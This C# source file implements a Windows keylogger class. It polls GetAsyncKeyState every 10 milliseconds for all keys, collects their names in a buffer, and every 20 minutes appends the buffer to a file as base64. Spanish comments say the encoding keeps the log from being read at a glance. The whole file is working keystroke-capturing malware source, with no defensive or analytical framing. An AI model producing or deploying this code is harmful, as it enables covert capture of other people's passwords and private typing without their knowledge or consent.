using System;
using System.Runtime.InteropServices;
using System.IO;

namespace KeyLoggerLocal
{
    public class KeyLogger
    {
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey);

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(Int32 vKey);

        private String keybuffer;
        private System.Timers.Timer CheckKey;
        private System.Timers.Timer FlushBuffer;
        private String file;

        #region Propertys

        public Boolean Enabled
        {
            get
            {
                return CheckKey.Enabled && FlushBuffer.Enabled;
            }
            set
            {
                CheckKey.Enabled = value;
                FlushBuffer.Enabled = value;
            }
        }

        public Double FlushInterval
        {
            get
            {
                return FlushBuffer.Interval;
            }
            set
            {
                FlushBuffer.Interval = value;
            }
        }

        public Double CheckInterval
        {
            get
            {
                return CheckKey.Interval;
            }
            set
            {
                CheckKey.Interval = value;
            }
        }

        public String File
        {
            get
            {
                return file;
            }
            set
            {
                file = value;
            }
        }

        #endregion

        public KeyLogger(String filename)
        {
            keybuffer = string.Empty;

            File = filename;

            CheckKey = new System.Timers.Timer();
            CheckKey.Enabled = true;
            CheckKey.Elapsed +=(CheckKey_Elapsed);
            CheckKey.Interval = 10;

            FlushBuffer = new System.Timers.Timer();
            FlushBuffer.Enabled = true;
            FlushBuffer.Elapsed += (FlushBuffer_Elapsed);
            FlushBuffer.Interval = 1200000; // 20 Minutos
        }

        private void CheckKey_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            foreach (Int32 h in Enum.GetValues(typeof(System.Windows.Forms.Keys)))
            {
                // Comprobamos si los bits mas significativos estan activos en caso afirmativo
                // añadimos el nombre correspondiente a la tecla pulsada al buffer
                if (GetAsyncKeyState(h) == -32767)
                    keybuffer += Enum.GetName(typeof(System.Windows.Forms.Keys), h) + " ";
            }
        }

        private void FlushBuffer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            Flush2File(file, true);
        }

        public void Flush2File(string file, bool append)
        {
            try
            {
                StreamWriter sw = new StreamWriter(file, append);

                // Añadimos la entrada al fichero convertida a base64 para añadir algo de seguridad y que 
                // no se pueda leer el fichero a simple vista, esta solucion es una solucion rapida, lo correcto
                // seria utilizar alguna encriptacion mas fuerte.
                sw.WriteLine(Convert.ToBase64String(System.Text.Encoding.Default.GetBytes(keybuffer)));
                sw.Close();

                keybuffer = string.Empty;
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }
    }
}
